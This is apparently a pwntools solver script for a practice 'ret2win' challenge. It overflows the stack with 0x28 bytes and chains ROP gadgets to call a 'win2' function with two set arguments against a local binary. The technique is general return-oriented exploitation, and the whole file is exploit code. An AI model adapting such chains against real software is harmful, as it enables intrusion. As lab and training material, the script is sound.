from pwn import *
import sys

def get_function_to_jump(elf_object: ELF, function_name) -> bytes:
    return p64(elf_object.symbols[function_name])

# Or use ROPGadget --biary=<binary_name>
def get_rop_gadgets(rop_object: ROP) -> bytes:
    
    pop_rdi = p64(rop_object.find_gadget(['pop rdi', 'ret'])[0])
    pop_rsi_r15 = p64(rop_object.find_gadget(['pop rsi', 'pop r15' , 'ret'])[0])
    ret = p64(rop_object.find_gadget(['ret'])[0])

    return pop_rdi, pop_rsi_r15, ret


def exploit(process_object: process | remote, elf_object: ELF, rop_object: ROP) -> None:
    
    # Step 1: Search gadgets addresses converted in little endian
    pop_rdi, pop_rsi_r15, ret = get_rop_gadgets(rop_object)

    # Step 2: Get function address and convert in little endian
    win_functions = get_function_to_jump(elf_object, "win2")

    # Step 3: Convert params in little_endian
    arg_1 = p64(0x31)
    arg_2 = p64(0xC0DE)

    # Step 4: Craft payload 
    payload = 0x28 * b'A' + pop_rdi + arg_1 + pop_rsi_r15 + arg_2 + p64(0x0) + win_functions

    
    print(process_object.recv())
    process_object.sendline(payload)
    print(process_object.recv())

def main() -> None:

    process_object = process("./ret2win")
    elf_object = ELF("./ret2win", checksec=False)
    rop_object = ROP("./ret2win")

    exploit(process_object, elf_object, rop_object)

if __name__ == "__main__":
    main()
    